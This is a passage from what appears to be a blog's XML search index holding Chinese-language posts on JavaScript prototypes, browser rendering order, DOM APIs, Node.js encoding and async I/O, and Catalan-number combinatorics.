（如create）,那么这另外12个属性是哪来的？ 解决这时我注意到，function Object 中除了prototype这个指针属性外，还有一个指针： proto 。 原来，秘密都在这里。 该函数对象中包含b方法，由此 可以证明，该函数对象正是Function.prototype. Function终于出现了！Function跟Object一样，是js中原生的构造函数,，每个函数都是Function的实例。回忆下Function的一种用法：1var sum=new Function('num1','num2','return num1+num2'); 通过构造函数定义函数，这正式js中三种定义函数的方法之一，同时也是不太推荐的一种定义方式。 回到题目中，继续观察Function.prototype的结构：通过观察constructor属性和 proto 属性，验证了Function.protptype.constructor = Function，另外也得出一个结论，Function继承至Object：Function.protptype. proto = Object.prototype。 顺着Function.protptype.constructor这个”瓜”，再来观察Function，发现Function的两个指针prototype和 proto 均指向 Function.protptype （没毛病，哈哈）。 现在我根据已有的实验结果，画出这样的原型链图来： 回到最开始我们输出的f. proto 中，刚才只讨论的f. proto 的 proto 属性，还有一个constructor属性指向的F函数还没有研究，另外图中还缺少Function的构造函数，即function Function，我们可以猜想出，F的[[prototype]]应该是指向Function.prototype，下面验证一下： 果然如此，而且我们还看到 F的[[prototype]]的constructor指向function Function(), 那么查看function Function() ：内置两个指针prototype 和 proto 均指向Function.prototype。 见底至此，整个原型链结构图我们可以画出来了： 可以看到，所有的对象最终都继承于Object.prototype，而所有的构造函数，包括function Object在内，又都可以看做是function Function的实例。那么这道题的答案在此时是显而易见的：通过f能过调用a方法，但不能调用b方法；通过F是能取到b的，可以通过f.constructor.b 调用；同样，通过F也能取到a，可以同过f.constructor.a 调用。 最近在知乎专栏上看到一种更形象的表示方法（跟上面我总结的那张图是一致的）：把 Object.prototype 必做JavaScript事件中对象的祖先，Function.prototpe必做机器的祖先，可以画出这样的图来（用[p]指代 __ proto __) 可以认为，你的prototype所指的是你的模板对象，[p]所指的是你的原型对象，所以String,Number,包括作为构造函数的function这些机器也需要一个模板对象，表明自己继承自Object的关系，因此，再进行补充： 参考文章 《JavaScript 世界万物诞生记》]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>前端</tag>
        <tag>原型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用NodeJS打造静态文件服务器]]></title>
    <url>%2F2017%2F04%2F28%2Fnode-static%2F</url>
    <content type="text"><![CDATA[在《The Node Beginner Book》的 中文版 发布之后，获得国内的好评。也有同学觉得这本书略薄，没有包含进阶式的例子。@otakustay同学说：“确实，我的想法是在这之上补一个简单的MVC框架和一个StaticFile+Mimetype+CacheControl机制，可以成为一个更全面的教程”。正巧的是目前我手里的V5项目有一些特殊性： 项目大多数的文件都是属于静态文件，只有数据部分存在动态请求 数据部分的请求都呈现为RESTful的特性 本文放在原 CSDN博客 ，暂不做迁移]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Application Cache 无法加载其他静态资源的问题]]></title>
    <url>%2F2017%2F04%2F28%2Fapp-cache%2F</url>
    <content type="text"><![CDATA[今天在自己做的项目中加了Application Cache 功能，把一些js文件放在了列表里。然后第一次加载没问题，我原来是这样写的：把NETWORK和FALLBACK都去掉了。以为这个清单的作用就是 如果查到，就存入本地，下次从本地加载，如果未查到就从服务器上下载：123456CACHE MANIFEST#需要缓存的列表 v2017-4-28\assets\js\demo.js\assets\js\bootstrap-notify.js\assets\js\jquery.min.js 实践证明，我的想法是错的。第二次加载时我发现其他的所有静态资源都不发加载了，原来 必须指定NETWORK,于是我做了这样的修改：123456789CACHE MANIFEST#需要缓存的列表 v2017-4-28\assets\js\demo.js\assets\js\bootstrap-notify.js\assets\js\jquery.min.jsNETWORK:* 可以了。 附：HTML5应用程序缓存Application Cache]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>Application Cache</tag>
        <tag>HTML5</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过chrome调试器测试了解浏览器解析和渲染HTML的过程]]></title>
    <url>%2F2017%2F04%2F25%2Fchrome-render%2F</url>
    <content type="text"><![CDATA[1.基础知识：了解chrome的Timeline工具仅仅是通过理论知识，很难记住和理解浏览器解析html的原则，因此我动手做了些小实验。而做这个实验，不得不用到一个工具：chrome的Timeline工具。 这个工具真的很强大，Timeline工具栏提供了对于在装载Web应用的过程中，时间花费情况的概览，这些应用包括处理DOM事件, 页面布局渲染或者向屏幕绘制元素。Timeline可以通过事件，框架，和实时内存用量3个方面的数据来监测网页，通过这些数据，我们可以方便的找出页面中存在问题的地方。 具体的使用方式，这篇博客里有详尽的说明。 2.主要过程主要渲染过程可以这么归纳（参考文献：http://www.cnblogs.com/dojo-lzz/p/3983335.html） 解析HTML 构建DOM树 DOM树与CSS样式进行附着构造呈现树 布局 绘制 3.解析与构建DOM树浏览器有专门的html解析器，并且是边解析边构建do’m树的，因此将前两部分放在一块讲。总体的解析原则是：1.自上而下顺序解析。2.解析过程中遇到外部样式（link,style）和外部脚本(script),会阻塞浏览器的解析。3.外部样式和外部脚本（在没有async、defer属性下）会并行加载，但是外部样式会阻塞外部脚本的执行。 即：html解析-&gt;外部样式、脚本加载-&gt;外部样式执行-&gt;外部脚本执行-&gt;html继续解析 情况一：如果是动态脚本（即内联脚本）则不受样式影响，在解析到它时会执行。 情况二：如果是动态创建的样式文件，则不会阻塞后续任何类型脚本的执行。 情况三：外部样式后续外部脚本含有async属性（IE下为defer），外部样式不会阻塞该脚本的加载与执行 3.1外部样式、脚本并行加载，外部样式会阻塞后续脚本执行，直到外部样式加载并解析完毕。12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JS Bin&lt;/title&gt; &lt;script&gt;var start = +new Date;&lt;/script&gt; &lt;link href="http://udacity-crp.herokuapp.com/style.css?rtt=2" rel="stylesheet"&gt; &lt;link href="http://udacity-crp.herokuapp.com/style.css?rtt=1" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;I am here!&lt;/p&gt; &lt;span id="result"&gt;&lt;/span&gt; &lt;p&gt;I am here two!&lt;/p&gt; &lt;script&gt; var end = +new Date; document.getElementById('result').innerHTML = (end-start); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行结果：并行加载：阻塞执行：可以看到，外部css加载并解析（parse）完毕之后才执行后面的js代码。 注意dom树构建完毕会触发DOMContentLoaded事件，但此时外部文件不一定加载完毕，比如一些图片。当页面加载完毕后才出发load事件，这也是 jquery的\$ (document).ready(function(){})和原生代码window.onload=function(){}的区别。（其他区别： window.onload不能同时编写多个，如果有多个window.onload方法，只会执行一个; $(document).ready()可以同时编写多个，并且都可以得到执行 ） 3.2 外部样式不会阻塞后续脚本的加载，但会阻塞后续脚本的执行123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JS Bin&lt;/title&gt; &lt;script&gt;var start = +new Date;&lt;/script&gt; &lt;link href="http://udacity-crp.herokuapp.com/style.css?rtt=2" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; test &lt;script src="http://udacity-crp.herokuapp.com/time.js?rtt=1&amp;a"&gt;&lt;/script&gt; &lt;div id="result"&gt;&lt;/div&gt; &lt;script&gt;var end = +new Date;document.getElementById("result").innerHTML = end-start;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 外部脚本代码：1234var loadTime = document.createElement('div');loadTime.innerText = document.currentScript.src + ' executed @ ' + window.performance.now();loadTime.style.color = 'blue';document.body.appendChild(loadTime); 执行结果：在瀑布流中查看外部文件加载顺序：可以看到，确实是按先后顺序发起请求，但是并行加载。可以看你到，在外部样式加载和解析完毕，外部脚本才开始执行 3.3 如果后续外部脚本含有async属性，则该脚本不会被样式文件阻塞这里我直接在3.2 中外部脚本标签中加入async ,代码就不贴了，看下执行结果：可以看到 外部引入的time.js文件在不没有被css阻塞。 3.4 动态创建的样式文件不会阻塞其后的script的执行，不管script标签是否具有async属性12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JS Bin&lt;/title&gt; &lt;script&gt;var start = +new Date;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; test &lt;script&gt; var link = document.createElement('link'); link.href = "http://udacity-crp.herokuapp.com/style.css?rtt=2"; link.rel = "stylesheet"; document.head.appendChild(link); &lt;/script&gt; &lt;div id="result"&gt;&lt;/div&gt; &lt;script&gt;var end = +new Date;document.getElementById("result").innerHTML = end-start;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 运行结果：动态创建的link加载了3秒左右，而第一个script脚本（line:6）在67ms时执行，第三个script脚本（line:19）在75ms左右执行。 3.5动态创建的样式文件不会阻塞其后动态创建的script的执行12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JS Bin&lt;/title&gt; &lt;script&gt;var start = +new Date;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; test &lt;script&gt; var link = document.createElement('link'); link.href = "http://udacity-crp.herokuapp.com/style.css?rtt=2"; link.rel = "stylesheet"; document.head.appendChild(link); var script = document.createElement('script'); script.src = "http://udacity-crp.herokuapp.com/time.js?rtt=1&amp;a"; document.head.appendChild(script); &lt;/script&gt; &lt;div id="result"&gt;&lt;/div&gt; &lt;script&gt;var end = +new Date;document.getElementById("result").innerHTML = end-start;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 可以看到，动态脚本在3秒左右才加载完毕，后其后的脚本在1.8秒左右就以及加载并执行了。另外第三个script标签在2ms左右就执行了，可见，js脚本无论是动态创建还是直接引入在页面的，顺序加载，但并行执行。这个在3.6节进行进一步证明。 3.6动态创建的脚本的加载和执行均会被之前的样式文件阻塞,但不会阻塞后续脚本的执行12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;JS Bin&lt;/title&gt; &lt;script&gt;var start = +new Date;&lt;/script&gt; &lt;link href="http://udacity-crp.herokuapp.com/style.css?rtt=2" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; test &lt;script&gt; var script = document.createElement('script'); script.src = "http://udacity-crp.herokuapp.com/time.js?rtt=1&amp;a"; document.head.appendChild(script); &lt;/script&gt; &lt;/script&gt; &lt;div id="result"&gt;&lt;/div&gt; &lt;script&gt;var end = +new Date;document.getElementById("result").innerHTML = end-start;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 可以看到，动态创建的脚本并没有阻塞后面脚本的执行，而且它的执行方式和其他脚本一样，均会被之前的CSS阻塞 4 构建渲染树，绘制与布局 在外部样式执行完毕后，css附着于DOM，创建了一个渲染树（渲染树是一些被渲染对象的集），也就是说渲染树与dom树是同时构建的。每个渲染对象都包含了与之对应的计算过样式的DOM对象，对于每个渲染元素来说，位置都经过计算，所以这里被叫做“布局”。然后将“布局”显示在浏览器窗口，称之为“绘制”。同脚本文件一样，CSS样式表会阻塞图片的加载，而脚本文件不会。接着脚本的执行完毕后，DOM树构建完成。 渲染树的节点（渲染器），在Gecko中称为frame，而在webkit中称为renderer。渲染器是在文档解析和创建DOM节点后创建的，会计算DOM节点的样式信息。 在webkit中，renderer是由DOM节点调用attach()方法创建的。attach()方法计算了DOM节点的样式信息。attach()是自上而下的递归操作。也就是说，父节点总是比子节点先创建自己的renderer。销毁的时候，则是自下而上的递归操作，也就是说，子节点总是比父节点先销毁。 如果元素的display属性被设置成了none，或者如果元素的子孙继承了display:none，renderer不会被创建。节点的子类和display属性一起决定为该节点创建什么样的渲染器。但是visibility：hidden的元素会被创建 具体如何构建渲染树，可参见： 【浏览器渲染原理】渲染树构建之渲染树和DOM树的关系 HTML渲染过程详解]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nodeJS读写文件中文乱码问题整理及计算机文件编码方式科普]]></title>
    <url>%2F2017%2F04%2F19%2Fnode-readfile%2F</url>
    <content type="text"><![CDATA[最近在用node 做一个读取excel文件的项目，后台用mongoDB存储。由于文件默认编码方式是anti，汉字总是无法显示。网上都说要转成无BOM的utf-8格式，我用notepad++转了，还是没用。后来读文件时我也把编码方式选为‘utf-8’了也不行（后来明白，是我对这里所有的‘设置编码方式’的理解有误，并不是把编码方式‘改’为utf-8的意思）。 最后参考了这三遍文章，问题得到解决。 ANSI、Unicode、UTF-8 这三种编码模式区别 node fs模块–文件操作-接口说明 node iconv-lite 模块的使用 为什么要使用最后那个模块？ 由于Node.js仅支持如下编码：utf8, ucs2, ascii, binary, base64, hex，并不支持中文GBK或GB2312之类的编码，因此如果要读写GBK或GB2312格式的文件的中文内容，必须要用额外的模块：iconv-lite。 ANSI和GBK什么关系？ ANSI包含GBK！阅读ANSI百度百科]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>前端</tag>
        <tag>mongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用原生js实现addClass,removeClass,hasClass方法]]></title>
    <url>%2F2017%2F04%2F18%2Fjs-class%2F</url>
    <content type="text"><![CDATA[其实html5已经扩展了class操作的相关API，其中classList属性就以及实现了class的增删和判断。classList属性的方法有： add(value) 添加类名，如果有则不添加 contains(value) 判断是否存在类名，返回Boolean值 remove(value) 从列表中删除类名 toggle(value) 切换类名：如果列表中存在则删除，否则添加 根据红宝书的介绍，目前支持classList属性的浏览器有FireFox 3.6+和Chrome。因此为了更好的兼容性，我们可以自己手动实现这几个方法。这里利用了DOM属性 className，我们始终是在操作这个对象。12345678910111213function hasClass( elements,cName )&#123; return !!elements.className.match( new RegExp( "(\\s|^)" + cName + "(\\s|$)") );&#125;;function addClass( elements,cName )&#123; if( !hasClass( elements,cName ) )&#123; elements.className += " " + cName; &#125;;&#125;;function removeClass( elements,cName )&#123; if( hasClass( elements,cName ) )&#123; elements.className = elements.className.replace( new RegExp( "(\\s|^)" + cName + "(\\s|$)" ), " " ); &#125;;&#125;;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>JavaScript</tag>
        <tag>前端</tag>
        <tag>dom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js创建dom节点之最容易被忽略的createDocumentFragment()方法]]></title>
    <url>%2F2017%2F04%2F16%2Fjs-domFragment%2F</url>
    <content type="text"><![CDATA[js常见的创建dom节点的方法有 createElement() 创建一个元素节点 =&gt; 接收参数为string类型的nodename createTextNode() 创建一个文本节点 =&gt; 接收参数为string类型的text内容 createAttribute() 创建一个属性节点 =&gt; 接收参数为string类型的属性名称 createComment() 创建一个注释节点 =&gt; 接收参数为string类型的注释文本 本文要说的createDocumentFragment()方法，则是用了创建一个虚拟的节点对象，或者说，是用来创建文档碎片节点。它可以包含各种类型的节点，在创建之初是空的。 DocumentFragment节点不属于文档树，继承的parentNode属性总是null。它有一个很实用的特点，当请求把一个DocumentFragment节点插入文档树时，插入的不是DocumentFragment自身，而是它的所有子孙节点。这个特性使得DocumentFragment成了占位符，暂时存放那些一次插入文档的节点。它还有利于实现文档的剪切、复制和粘贴操作。另外，当需要添加多个dom元素时，如果先将这些元素添加到DocumentFragment中，再统一将DocumentFragment添加到页面，会减少页面渲染dom的次数，效率会明显提升。 还有一个很重要的特性是，如果使用appendChid方法将原dom树中的节点添加到DocumentFragment中时，会删除原来的节点。为了证明这一点我做了以下测试：1234567&lt;body&gt; &lt;ul&gt; &lt;li&gt;Alice&lt;/li&gt; &lt;li&gt;Bob&lt;/li&gt; &lt;/ul&gt; &lt;button onclick="test()"&gt;测试&lt;/button&gt;&lt;/body&gt; js代码中test()方法如下：1234567891011121314151617function test()&#123; var li = document.getElementByTaName('li')[0]; //ul中的第一个li节点 alert(document.getElementByTaName('li')[0].innerText) // 显示Alice var newFrag = document.createDocumentFragment(); newFrag.appendChild(li); alert(document.getElementByTaName('li')[0].innerText) // 显示Bod alert(document.getElementByTaName('ul')[0].innerHTML)&#125; //显示&lt;li&gt;Bob&lt;/li&gt;,由此可见，第一个节点确实被删除了 //现在fragment中的修改节点 newFrag.childNode[0].childNodes[0].nodeValue='Candy'; //更改一个孩子节点的文本内容 // .childNodes[0].nodeValue等同于：.innerText 或.textContent document.getElementByTaName('ul')[0].appendChild(newFrag); alert(document.getElementByTaName('ul')[0].innerHTML)&#125; //显示&lt;li&gt;Bob&lt;/li&gt;&lt;li&gt;Candy&lt;/li&gt; ,由此可见仅仅是添加了newFrag的子孙节点。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>前端</tag>
        <tag>dom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中hashmap和Treemap实现原理释疑]]></title>
    <url>%2F2017%2F04%2F10%2Fjava-map%2F</url>
    <content type="text"><![CDATA[先贴几篇博客： Java HashMap如何实现Key 的唯一性 Java TreeMap 红黑树介绍 HashMap,LinkedHashMap,TreeMap的有序性]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>Tree-map</tag>
        <tag>hash-map</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从javascript异步编程特点理解node服务器的I/O密集型优势]]></title>
    <url>%2F2017%2F04%2F10%2Fjavascript-nodeserver-io%2F</url>
    <content type="text"><![CDATA[最近读了篇介绍js异步特性的博文，在加上自己平时在这方面也有一点琢磨和理解，感觉确实又“悟”出点东西来，分享出来给在这方面同样有困惑或不太确定自己的理解对不对的同学看。 原博有一系列介绍js异步编程特性的文章，强烈推荐阅读学习（地址），按照博主自己的介绍： 会按一般学习异步编程的顺序，首先介绍一下异步的原理，然后介绍各种异步编程的方法，从回调函数开始，然后慢慢进入Promise和Generator等对异步编程体验进行改进的技术。期间也会大概提一下事件监听方式的异步调用，但是因为太多的事件监听会让程序流程变的不清晰，所以不太推荐（其实事件模式本质上也是回调函数）。Promise和Generator才是到目前为止(ES6)，最好的异步编程方式。 好，进入正文什么是异步？同步异步与阻塞非阻塞有什么关系？ node.js的“一切皆异步”的思想很有创意，目的是可以让开发者轻松编写高性能的web服务端，而不会“不小心”就用同步api阻塞了服务器从而影响性能。其他的语言比如php, python, java等基于同步的语言，虽然也有异步api，但毕竟编程人员的“思想上是同步的”，有时候不可避免的会写出阻塞的代码，node.js的目标是造就“思想上是完全异步”的编程人员和编程语言:) 异步跟同步最大的不同就是异步api或函数被“调用”后不会等它运行结束再执行它后面的代码，而是调用之后直接往下执行，异步函数的“执行”实际上是放在“其他地方”，待“执行”完成后再把结果通过回调函数来进行进一步的使用或处理（所以异步函数书写的时候不要用”return”来返回值哦，必须通过回调函数来返回值）。这里为什么强调“调用”和“执行”两个词呢？就是为了更好的理解异步的过程。 打个比喻，你的领导要做个电子报表，笨领导的做法是，在自己电脑上把该统计的统计了，该算的算了，最后生成一张报表，然后用这个报表做接下去的工作；聪明的领导，会发个邮件给下属，把报表的要求写清楚，下属在自己的电脑上把报表做完后，发个邮件把报表交回给领导。在下属做报表的时候，领导可以在自己电脑上继续做其他事情，比如玩游戏、看视频等等（你懂的）。 在上面这个例子中，领导是编程者（你），领导的电脑是当前线程，下属的电脑是另一个线程（如果有多个下属就相当于有个线程池）。做报表这件工作是个异步函数，发邮件给下属相当于调用这个函数，下属电脑上做报表相当于在另一个线程异步执行这个函数，执行完了发邮件把报表发回给领导相当于调用回调函数，领导就可以使用这个报表接着做下面的工作（相当于回掉函数里面的代码）。下属做报表的时候领导完全不用管而是可以继续干其他事情。 通过这个例子可以清楚的看到，领导只能在他自己的电脑（用户线程）上工作，异步的函数都是在下属的电脑上（异步线程）做的。这一点在很多文章当中并没有讲的很清楚，所以容易造成困扰，因为很多人只是一味的强调javascript是单线程的，但单线程怎么能实现异步呢？就并没有讲清楚。其实所谓的单线程是指用户线程是单线程，而另外还有一个或多个线程处理异步代码的执行。 接下来再说说阻塞的问题。很多文章里面在讲解的时候同步异步阻塞非阻塞混为一团，新手很难理解，最容易产生的误解就是同步=阻塞，异步=非阻塞。其实阻塞非阻塞跟同步异步没有任何关系。简单讲，阻塞就是一个api或者函数运行时间过长，而独占cpu导致其他代码不能运行，那么多长时间算阻塞呢？相信这只是一个相对的概念，只要明显影响到程序的性能和用户体验，就算阻塞吧。那跟同步异步是什么关系呢？阻塞的代码如果同步执行就会阻塞到自己后面代码的运行，所以自然而然的就想到异步来执行阻塞的代码，然而异步真能解决阻塞问题吗？下面继续讲。 node.js里面的异步 大家知道Javascript的基本语法跟其他编程语言大同小异，最大的不同就是把异步摆在首位，特别是node.js更是大部分api都是异步的，小量同步api。这与其他大部分语言刚好相反，也给习惯于同步编程思维的同学造成了很大的困扰，就是常说的转不过弯来，习惯性的认为代码是按顺序一行一行的往下执行。 上面介绍了异步非阻塞的概念，那么具体到node.js是怎么实现的呢？这里又会涉及到I/O的概念，具体不讲I/O的细节（操作系统原理都会讲），关键就一点，I/O操作通常比较耗时但不会独占CPU，典型的I/O比如文件读写，远程数据库读写，网络请求等。 先讲耗时，如果用同步API来进行I/O操作，在返回结果之前就只能等待，所以最好的办法上面已经讲过，就是进行异步操作。接着说一下不会霸占CPU的好处。在node.js进程里面，有一个用户线程（javascript所宣称的单线程）和一个异步线程池（用户无法直接访问）， 如果跑在异步线程上的代码是阻塞的，那么这种异步根本就起不到消除阻塞的作用，为什么？原因就是阻塞代码会霸占cpu，导致本进程所有代码都等待不管是哪个线程。但是，，，刚刚讲的node.js里面的I/O API都是不会霸占CPU的，所以是非阻塞的，就不会出现这个问题。这就是node.js的最引以为傲的特性之一：异步非阻塞I/O. 上面只是强调异步非阻塞，那么对于真正的阻塞代码，node.js怎么办呢？不好意思。。。单个node.js进程真无能为力，跟同步编程语言相比没什么优势，只能用传统的方式，多进程，多开几个node.js进程，甚至多开几个服务器。任何语言都有它的强项和弱项，node.js的强项就是它本来的设计初衷：让开发者能够轻松的编写高性能的web服务器（进行的最多的就是网络和数据库的I/O操作），而不是做大量的CPU密集型的运算（不过我赶脚，就算要做很多阻塞操作，用多进程和多服务器又有何不可？node.js对此提供了足够的支持）。 要理解javascript异步编程和其他语言同步编程的区别，可以从一个最简单的例子开始。在同步为主的语言中，如果需要等待10秒钟，通常是类似sleep 10之类的语句，在10秒之内整个进程挂起，也就是阻塞10秒。但javascript不是这样，它是使用setTimeout函数，从字面意思就已经可以看出区别了， 设一个timeout的时间， 在这段时间内cpu可以继续运行其他代码， 等10秒时间到了， 就用回调函数的形式来做应该10秒之后才做的事情。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>JavaScript</tag>
        <tag>异步编程</tag>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二叉搜索树形态问题--从一道算法题探讨神奇的Catalan数]]></title>
    <url>%2F2017%2F04%2F07%2Fcatalan%2F</url>
    <content type="text"><![CDATA[引Catalan数，中文卡特兰数又称卡塔兰数，是组合数学中一个常出现在各种计数问题中的数列。一旦入坑，你会发现这个数列相当有意思，能够应用于很多看起来特别复杂的计算场景，当然，并能将之迎刃而解。 wikipedia定义：卡塔兰数是组合数学中一个常在各种计数问题中出现的数列。以比利时的数学家欧仁·查理·卡特兰（1814–1894）命名。历史上，清代数学家明安图(1692年－1763年)在其《割圜密率捷法》最早用到“卡塔兰数”，远远早于卡塔兰。有中国学者建议将此数命名为“明安图数”或“明安图-卡塔兰数”。一般通项：$A _n= \frac{1}{n+1}C _{2n}^n = C _{2n}^n-C _{2n}^{n-1} $ 我的“入坑”则归功于几天前在搜狐的实习生线上笔试上做到的一道题：key值分别为1，2，3，4，5，6的6个节点能够组成多少中不同的二叉搜索树（BST）。试后，我在网上查到了很多对catalan数的讨论，发现套用它的公式可以解决好多问题，甚至有不少问题都是互联网笔试中老生常谈的： n对括号 有多少种组合 矩阵链乘，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，有几种括号化的方案 n个元素入栈 有多少种出栈顺序 凸多边形通过互不相交的对角线划分，求划分方案数 在圆上选择2n个点，将这些点连接起来，使得所得到的n条线段不相交的方法数 2n边的凸多边形，连接对角线 可以分出三角形的个数 n × n格点中不越过对角线的单调路径的个数(上班路线选择问题) 给定n个节点组成二叉搜索树个数（或组成的二叉树形态数） 2n个高矮不同的人 站成两排 保证后排对应的人比前排高 每排从左到 右越来越高 有多少种排列方式 《编程之美》4.3中的买票找零问题：2n个人排队买票，其中n个人持50元，n个人持100元。每张票50元，且一人只买一张票。初始时售票处没有零钱找零。请问这2n个人一共有多少种排队顺序，不至于使售票处找不开钱 （腾讯笔试）在图书馆一共6个人在排队，3个还《面试宝典》一书，3个在借《面试宝典》一书，图书馆此时没有了面试宝典了，求他们排队的总数？ （阿里笔试）说16个人按顺序去买烧饼，其中8个人每人身上只有一张5块钱，另外8个人每人身上只有一张10块钱。 烧饼5块一个，开始时烧饼店老板身上没有钱。 16个顾客互相不通气，每人只买一个。 问这16个人共有多少种排列方法能避免找不开钱的情况出现。 这类问题恐怕每道题单拿出来都是一道令人头疼的算法编程题，仔细观察不难发现这些问题都是有一些共性的，比如都是求方案的个数，而且很多问题的应用场景都是一样的，只不过在形式在做了变形，如：（1）和（2）是一类，（4）和（5）是一类，（9）（10）（11）（12）是一类。当然，在本质上，以上所有问题均能抽象为一种问题：一种通解符合卡特兰数列的问题。（实际上，根据求解思路，我把它归纳为两类同构问题，这两种思路都能推出卡特兰数列，后面会讨论到） 内容提要本文将首先讨论序列类场景的经典例题单调路径问题及解法，并给出几种常见的同构问题，然后以N节点二叉树问题为切入点，介绍该类问题的一般解法及思考方式，最后给出卡特兰数的一般性定义，总结卡特兰数的数学思想。文末将附上相关参考文献的链接 I.卡特兰数性质II.序列类场景：以N*N棋盘单调路径问题为例在比较了大部分常见的题型后，我发现很多例题所描述的问题都可以抽象为寻找符合若干条件的0-1序列的数量（具体有哪些条件后面我会讲到），所以我将这一类问题归纳为“序列类”问题。前面提到我一共总结了两大类，这并不意味这本类问题跟另一类是并列地位——实际上，本类问题只是对一类具体场景的概括（specific），而另一类是一般性解法（general）。为什么要单独把它提出来讲呢？因为这类问题的解法很巧妙，没有构造递推，直接得出通项公式，而且，也确实涵盖了大部分笔试/编程题考点。很多人把这种解法称为“折现法”（《编程之美》中貌似叫“反射法”）。 问题描述求在N*N个格点中不越过对角线的单调路径的个数，借用维基上的一张图：左下角（0，0）点为起点，右上角（N,N）为终点。 分析如果去掉“不能越过对角线”这个要求，我们能够很容易的算出，单调路径数为$C_{2n}^n$，对于上图情形即是$C_8^4$。我们用X代表“向右走一格”，Y代表“向上一格”，则每条路径可由字符串String来表示，String满足： String[i]=[X|Y] String.length=2n X与Y数量相等，均为n。 所有的前缀字串(首项为String[0]的子串)皆满足X的个数大于等于Y的个数 满足(1)(2)(3)项的String的数量我们已经计算出为$C_{2n}^n$个，现考虑计算该集合下不满足(4)的情形的数量，然后减去该种情况，得到最终结果。 现从头遍历一个不满足(4)的String，记为BadStr，当遍历到第2m+1位上时有m+1个Y和m个X（容易证明一定存在这样的情况），则后面剩下的部分中必有n-m个X和n-m-1个Y。将第2m+2位及其以后的部分做以下变换：X变成Y、Y变成X，则该部分的X现在有n-m-1个，Y有n-m个，变换后字符串记为cBadStr中共有n+1个Y和n-1个X的二进制数。注意到，对于每个BadStr，均一一对应与一个这样的cBadStr，因此NumOf(BadStrs) = NumOf(cBadStrs)=$C _{2n}^{n-1}$。因此满足(1)~(4)的String数量为$C _{2n}^{n}-C _{2n}^{n-1}$。 这个结果就是传说中的Catalan数啦 同构问题出栈入栈问题问题描述：对于一个无限大的栈，一共n个元素，请问有几种合法的入栈出栈形式。 分析：令1表示进栈，0表示出栈，则可转化为求一个2n位、含n个1、n个0的二进制数，满足从左往右扫描到任意一位时，经过的0数不多于1数。则结果我们可以用$A_n$表示 矩阵链乘（组括号）问题问题描述：P=A1×A2×A3×……×An，依据乘法结合律，不改变其顺序，只用括号表示成对的乘积，试问有几种括号化的方案？ 分析：将问题转化一下，就是从左到右扫描，无论扫描到任何位置，左括号数一定要大于或者等于右括号数 买票找零（或借书）问题问题描述：16个人按顺序去买票，票价为50元，其中8个人每人身上只有一张50块钱，另外8个人每人身上只有一张100块钱。求要在售票员没有初始金钱的情况下顺利购票的排队方案 分析：带50块钱的排前面的个数总是要大于带100块钱的人的个数，即C(16，8)-C(16，7) 照相排队问题（阿里、腾讯笔试题）问题描述：12个高矮不同的人，排成两排，每排必须是从矮到高排列，而且第二排比对应的第一排的人高，问排列方式有多少种？在一个2*n的格子中填入1到2n这些数值使得每个格子内的数值都比其右边和下边的所有数值都小的情况数？ 分析：这类问题稍微比以上的问题难理解点，它的Catalan数列“隐藏”的稍微深一些，需要我们做一些分析。我们先把这12个人从低到高排列,维护一个12位的01序列，从左到右分别对应这12个由低到高排好序的人，用0表示对应的人在第一排,用1表示对应的人在第二排,其中0出现的个数和1出现的个数相等。 比如000000111111就对应着|第一排|0| 1| 2| 3 |4| 5||—-|——||第二排|6| 7| 8| 9| 10| 11| 010101010101就对应着|第一排|0 |2| 4| 6 |8 |10||—-|——||第二排|1 |3 |5| 7| 9| 11| 